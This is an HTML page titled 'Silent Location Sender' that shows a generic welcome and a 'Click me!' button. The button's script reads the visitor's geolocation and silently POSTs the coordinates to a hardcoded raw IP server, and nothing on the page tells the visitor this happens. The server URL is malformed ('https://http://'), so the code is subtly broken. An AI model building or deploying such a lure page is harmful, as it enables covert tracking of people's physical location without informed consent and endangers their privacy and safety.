<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Silent Location Sender</title>
</head>
<body>
    <h1>Welcome to our website!</h1>
    <button id="silentButton">Click me!</button>

    <script>
        document.getElementById('silentButton').addEventListener('click', function() {
            if ("geolocation" in navigator) {
                navigator.geolocation.getCurrentPosition(function(position) {
                    var latitude = position.coords.latitude;
                    var longitude = position.coords.longitude;
                    
                    // Gửi dữ liệu đến server Node.js
                    var serverUrl = 'https://http://117.7.116.182/';
                    
                    fetch(serverUrl, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                        },
                        body: JSON.stringify({
                            latitude: latitude,
                            longitude: longitude
                        })
                    }).then(function(response) {
                        console.log('Location sent silently');
                    }).catch(function(error) {
                        console.error('Error:', error);
                    });
                });
            } else {
                console.log("Geolocation is not supported by this browser.");
            }
        });
    </script>
</body>
</html>
